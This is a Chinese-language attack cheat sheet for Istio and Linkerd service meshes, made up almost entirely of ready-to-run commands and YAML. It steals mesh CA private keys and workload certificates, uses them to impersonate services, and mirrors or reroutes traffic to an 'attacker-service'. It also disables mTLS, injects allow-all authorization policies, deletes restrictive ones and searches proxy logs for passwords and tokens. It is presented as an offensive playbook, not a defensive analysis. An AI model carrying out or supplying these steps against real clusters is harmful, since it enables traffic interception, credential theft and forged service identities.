# Service Mesh 攻击技术详解

## Istio 配置窃取完整命令

### VirtualService 枚举

```bash
# 列出所有 VirtualService
kubectl get virtualservices --all-namespaces

# 获取详细配置（YAML）
kubectl get virtualservice SERVICE_NAME -n NAMESPACE -o yaml

# 提取路由规则（哪些 URI 路由到哪些服务）
kubectl get virtualservices -A -o yaml | grep -A 20 "http:" | grep -E "uri|route|destination|host|subset|weight"

# 提取故障注入配置（已有的混沌测试规则）
kubectl get virtualservices -A -o yaml | grep -A 10 "fault:"

# 提取超时和重试配置
kubectl get virtualservices -A -o yaml | grep -A 5 "timeout\|retries:"
```

### DestinationRule 枚举

```bash
# 列出所有 DestinationRule
kubectl get destinationrules --all-namespaces

# 获取详细配置
kubectl get destinationrule RULE_NAME -n NAMESPACE -o yaml

# 提取 mTLS 模式（DISABLE/SIMPLE/MUTUAL/ISTIO_MUTUAL）
kubectl get destinationrules -A -o yaml | grep -B 5 -A 5 "tls:"

# 提取子集定义（版本路由）
kubectl get destinationrules -A -o yaml | grep -A 10 "subsets:"

# 查找禁用 mTLS 的规则（攻击机会）
kubectl get destinationrules -A -o yaml | grep -B 10 "mode: DISABLE"
```

### Gateway 枚举

```bash
# 列出所有 Gateway
kubectl get gateways --all-namespaces

# 获取详细配置
kubectl get gateway GATEWAY_NAME -n NAMESPACE -o yaml

# 提取服务器配置（端口、主机名、TLS 设置）
kubectl get gateways -A -o yaml | grep -A 15 "servers:"

# 查找 TLS 证书引用
kubectl get gateways -A -o yaml | grep -A 5 "credentialName\|secretName"

# 查找 HTTP（非 TLS）入口——明文流量
kubectl get gateways -A -o yaml | grep -B 5 "protocol: HTTP"
```

### ServiceEntry 枚举

```bash
# 列出所有 ServiceEntry（外部服务白名单）
kubectl get serviceentries --all-namespaces

# 获取详细配置
kubectl get serviceentry ENTRY_NAME -n NAMESPACE -o yaml

# 提取外部服务地址
kubectl get serviceentries -A -o yaml | grep -E "hosts:|addresses:|ports:" -A 3

# 查找允许的外部数据库/API 地址
kubectl get serviceentries -A -o yaml | grep -E "host:" | sort -u
```

## Envoy Admin API 完整利用

### 信息收集端点

```bash
# 服务器信息（版本、启动时间、热重启次数）
curl -s http://localhost:15000/server_info | python3 -m json.tool

# 所有上游集群（最重要——服务发现）
curl -s http://localhost:15000/clusters
# 输出格式: service_name::IP:PORT::health_flags::weight
# 提取所有服务名
curl -s http://localhost:15000/clusters | grep -oP '^[^:]+' | sort -u

# 所有监听器
curl -s http://localhost:15000/listeners

# 完整配置 dump（JSON 格式，可能很大）
curl -s http://localhost:15000/config_dump > /tmp/full_config.json

# 仅 bootstrap 配置
curl -s http://localhost:15000/config_dump?resource=bootstrap

# 仅动态集群
curl -s http://localhost:15000/config_dump?resource=dynamic_active_clusters

# 仅路由配置
curl -s http://localhost:15000/config_dump?resource=dynamic_route_configs

# 证书信息
curl -s http://localhost:15000/certs

# 统计信息
curl -s http://localhost:15000/stats

# 运行时参数
curl -s http://localhost:15000/runtime
```

### 高级端点

```bash
# 查看特定集群的详细信息
curl -s "http://localhost:15000/clusters?format=json" | \
  python3 -c "import sys,json; [print(c['name']) for c in json.load(sys.stdin)['cluster_statuses']]"

# 热重启计数（判断是否有人在修改配置）
curl -s http://localhost:15000/hot_restart_version

# 内存分配（判断 Envoy 负载）
curl -s http://localhost:15000/memory

# 日志级别（可动态修改）
curl -s http://localhost:15000/logging

# 修改日志级别为 trace（获取更多信息，但可能产生大量日志）
curl -s -X POST "http://localhost:15000/logging?level=trace"
```

### 通过端口转发从外部访问

```bash
# 如果有 kubectl 但不在 Pod 内
kubectl port-forward POD_NAME -n NAMESPACE 15000:15000 &
curl -s http://localhost:15000/clusters

# 批量获取所有 Pod 的 Envoy 配置
for pod in $(kubectl get pods -n NAMESPACE -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== $pod ==="
  kubectl exec "$pod" -n NAMESPACE -c istio-proxy -- curl -s http://localhost:15000/clusters 2>/dev/null | head -20
done
```

## 流量劫持模板

### VirtualService 流量镜像（最隐蔽）

```yaml
# 将所有流向 target-service 的流量镜像一份到 attacker-service
# 正常流量不受影响，用户无感知
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: mirror-to-attacker
  namespace: TARGET_NS
spec:
  hosts:
  - target-service
  http:
  - route:
    - destination:
        host: target-service
        port:
          number: 8080
    mirror:
      host: attacker-service
      port:
        number: 8080
    mirrorPercentage:
      value: 100.0
```

### VirtualService 路由权重篡改

```yaml
# 将部分流量路由到攻击者服务（需要在同一 Mesh 内部署攻击者 Pod）
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: weight-hijack
  namespace: TARGET_NS
spec:
  hosts:
  - target-service
  http:
  - route:
    - destination:
        host: target-service
        subset: v1
      weight: 90
    - destination:
        host: attacker-service
      weight: 10
```

### VirtualService 基于 Header 的路由劫持

```yaml
# 只劫持带特定 Header 的请求（精准窃取，更隐蔽）
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: header-hijack
  namespace: TARGET_NS
spec:
  hosts:
  - target-service
  http:
  - match:
    - headers:
        x-debug:
          exact: "true"
    route:
    - destination:
        host: attacker-service
  - route:
    - destination:
        host: target-service
```

### DestinationRule mTLS 降级

```yaml
# 将目标服务的 mTLS 设为 DISABLE，允许明文访问
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: disable-mtls
  namespace: TARGET_NS
spec:
  host: target-service
  trafficPolicy:
    tls:
      mode: DISABLE
```

## TLS 证书窃取与利用

### Istio 证书提取（Pod 内）

```bash
# 新版 Istio（使用 SDS / Secret Discovery Service）
# 证书通过 Envoy SDS API 获取，文件可能不在磁盘上
# 但仍可通过 Envoy Admin 获取
curl -s http://localhost:15000/certs

# 旧版 Istio（证书挂载到磁盘）
cat /etc/certs/cert-chain.pem     # 服务证书链
cat /etc/certs/key.pem            # 私钥
cat /etc/certs/root-cert.pem      # CA 根证书

# 新版 Istio（证书路径）
cat /var/run/secrets/istio/cert-chain.pem
cat /var/run/secrets/istio/key.pem
cat /var/run/secrets/istio/root-cert.pem

# 分析证书内容
openssl x509 -in /var/run/secrets/istio/cert-chain.pem -text -noout
# 重点关注:
# - Subject Alternative Name (SAN): URI:spiffe://cluster.local/ns/NAMESPACE/sa/SA_NAME
# - 有效期: Not Before / Not After
# - Issuer: 签发 CA 信息

# 提取 SPIFFE ID
openssl x509 -in /var/run/secrets/istio/cert-chain.pem -noout -ext subjectAltName 2>/dev/null
```

### 使用窃取的证书

```bash
# 使用窃取的证书直接访问其他服务（绕过 Sidecar 认证）
curl --cert /tmp/stolen-cert.pem \
     --key /tmp/stolen-key.pem \
     --cacert /tmp/stolen-root-ca.pem \
     https://target-service.target-ns.svc.cluster.local:PORT/

# 从 K8s Secret 中提取 Gateway TLS 证书
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.crt}' | base64 -d > /tmp/gw-cert.pem
kubectl get secret CERT_SECRET -n istio-system -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/gw-key.pem

# 提取 Istio CA 根证书（可以签发任意服务证书）
kubectl get secret istio-ca-secret -n istio-system -o jsonpath='{.data.ca-cert\.pem}' | base64 -d > /tmp/istio-ca.pem
kubectl get secret istio-ca-secret -n istio-system -o jsonpath='{.data.ca-key\.pem}' | base64 -d > /tmp/istio-ca-key.pem

# 如果拿到了 Istio CA 私钥，可以为任意服务签发证书
# 这意味着可以伪造任意 SPIFFE 身份
```

### Linkerd 证书提取

```bash
# Linkerd Trust Anchor（CA 根证书）
kubectl get secret linkerd-identity-trust-roots -n linkerd -o jsonpath='{.data.ca-bundle\.crt}' | base64 -d

# Linkerd Identity Issuer（签发证书）
kubectl get secret linkerd-identity-issuer -n linkerd -o jsonpath='{.data.tls\.crt}' | base64 -d > /tmp/linkerd-issuer.pem
kubectl get secret linkerd-identity-issuer -n linkerd -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/linkerd-issuer-key.pem
```

## AuthorizationPolicy 绕过

### 枚举与分析

```bash
# 列出所有策略
kubectl get authorizationpolicies --all-namespaces

# 详细查看特定策略
kubectl get authorizationpolicy POLICY_NAME -n NAMESPACE -o yaml

# 查找宽松策略
kubectl get authorizationpolicies -A -o yaml | grep -B 10 -A 10 "action: ALLOW"

# 查找 DENY 策略（了解限制）
kubectl get authorizationpolicies -A -o yaml | grep -B 10 -A 10 "action: DENY"

# 检查 PeerAuthentication mTLS 模式
kubectl get peerauthentication -A -o yaml | grep -B 5 "mode:"
```

### 策略注入

```yaml
# 1. 允许所有流量（空 spec = 无条件 ALLOW）
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-all
  namespace: TARGET_NAMESPACE
spec: {}
---
# 2. 将 mTLS 降级为 PERMISSIVE（允许明文）
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: permissive-mtls
  namespace: TARGET_NAMESPACE
spec:
  mtls:
    mode: PERMISSIVE
---
# 3. 允许特定源的所有请求
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-from-attacker
  namespace: TARGET_NAMESPACE
spec:
  action: ALLOW
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/ATTACKER_NS/sa/ATTACKER_SA"]
```

### 策略删除

```bash
# 直接删除限制策略（最粗暴但最有效）
kubectl delete authorizationpolicy RESTRICTIVE_POLICY -n TARGET_NAMESPACE

# 删除前先备份（操作安全）
kubectl get authorizationpolicy POLICY -n NS -o yaml > /tmp/backup-policy.yaml
kubectl delete authorizationpolicy POLICY -n NS
```

## Linkerd 完整攻击流程

### 配置枚举

```bash
# 控制面配置
kubectl get configmap -n linkerd -o yaml
kubectl get configmap linkerd-config -n linkerd -o yaml

# ServiceProfile（Linkerd 的路由配置）
kubectl get serviceprofiles --all-namespaces -o yaml

# TrafficSplit（流量拆分，类似 Istio VirtualService）
kubectl get trafficsplit --all-namespaces -o yaml

# Server 和 ServerAuthorization（Linkerd 的策略控制）
kubectl get servers --all-namespaces -o yaml
kubectl get serverauthorizations --all-namespaces -o yaml
```

### Proxy Admin 利用

```bash
# Linkerd Proxy 的 admin 端口默认 4191
curl -s http://localhost:4191/metrics   # Prometheus 格式的指标
curl -s http://localhost:4191/ready     # 就绪检查
curl -s http://localhost:4191/live      # 存活检查
curl -s http://localhost:4191/shutdown  # 关闭代理（危险操作）

# 从指标中提取有价值的信息
curl -s http://localhost:4191/metrics | grep -E "request_total|response_total" | head -20
# 可以看到服务间的请求量和响应状态码

# 通过 Linkerd Proxy 直接执行
kubectl exec POD_NAME -n NAMESPACE -c linkerd-proxy -- cat /etc/linkerd/config
```

### Linkerd Dashboard

```bash
# Linkerd Dashboard 默认无需认证
kubectl port-forward -n linkerd deploy/linkerd-web 8084:8084

# Dashboard API（程序化获取数据）
# 列出所有已注入的 Pod
curl -s http://localhost:8084/api/pods

# 获取命名空间拓扑
curl -s http://localhost:8084/api/tps-reports?resource_type=namespace

# 获取服务间调用关系
curl -s http://localhost:8084/api/edges?resource_type=deployment&namespace=TARGET_NS
```

## Telemetry 与日志利用

### Istio 访问日志

```bash
# IngressGateway 日志（所有入站流量）
kubectl logs -n istio-system deployment/istio-ingressgateway --tail=200

# 特定 Pod 的 Sidecar 日志
kubectl logs -n NAMESPACE POD_NAME -c istio-proxy --tail=200

# 搜索敏感信息
kubectl logs -n NAMESPACE POD_NAME -c istio-proxy | grep -iE "password|secret|token|auth|cookie|session"

# 搜索特定路径的请求
kubectl logs -n NAMESPACE POD_NAME -c istio-proxy | grep -E "POST|PUT|DELETE"
```

### Prometheus

```bash
# 如果 Prometheus 在网格内可达
# 查询所有服务的请求指标
curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_requests_total" | python3 -m json.tool

# 查询特定服务的流量
curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_requests_total{destination_service_name=\"TARGET\"}"

# 查询 TCP 连接（了解服务通信模式）
curl -s "http://prometheus.istio-system:9090/api/v1/query?query=istio_tcp_connections_opened_total"

# 查询所有可用指标名
curl -s "http://prometheus.istio-system:9090/api/v1/label/__name__/values" | python3 -c "import sys,json; [print(m) for m in json.load(sys.stdin)['data'] if 'istio' in m or 'envoy' in m]"
```

### Kiali / Jaeger

```bash
# Kiali（Service Mesh 可视化）
kubectl port-forward -n istio-system deploy/kiali 20001:20001
# http://localhost:20001
# 功能：服务拓扑图、流量动画、配置验证、健康检查

# Jaeger（分布式追踪）
kubectl port-forward -n istio-system deploy/jaeger 16686:16686
# http://localhost:16686
# 功能：请求链路追踪、延迟分析、服务依赖图

# Grafana（如果部署）
kubectl port-forward -n istio-system deploy/grafana 3000:3000
# http://localhost:3000
# 预装的 Istio Dashboard：网格概览、服务详情、工作负载详情
```

## Istiod 控制面攻击

### Debug 端点

```bash
# Istiod 暴露的 Debug 端点（默认端口 15014）
# 如果能从 Pod 内访问 istiod：

# 所有已注册的 Endpoint
curl -s http://istiod.istio-system:15014/debug/endpointz

# 所有推送的配置
curl -s http://istiod.istio-system:15014/debug/configz

# 所有连接的 Proxy 列表
curl -s http://istiod.istio-system:15014/debug/connections

# Mesh 配置
curl -s http://istiod.istio-system:15014/debug/mesh

# 同步状态
curl -s http://istiod.istio-system:15014/debug/syncz

# 注册表中所有服务
curl -s http://istiod.istio-system:15014/debug/registryz
```

### istioctl proxy-config（需要 istioctl）

```bash
# 查看特定 Pod 的 Envoy 配置（通过 Istiod API）
istioctl proxy-config clusters POD_NAME.NAMESPACE
istioctl proxy-config listeners POD_NAME.NAMESPACE
istioctl proxy-config routes POD_NAME.NAMESPACE
istioctl proxy-config endpoints POD_NAME.NAMESPACE
istioctl proxy-config secret POD_NAME.NAMESPACE

# 分析配置问题
istioctl analyze -n TARGET_NAMESPACE

# 查看 xDS 同步状态
istioctl proxy-status
```
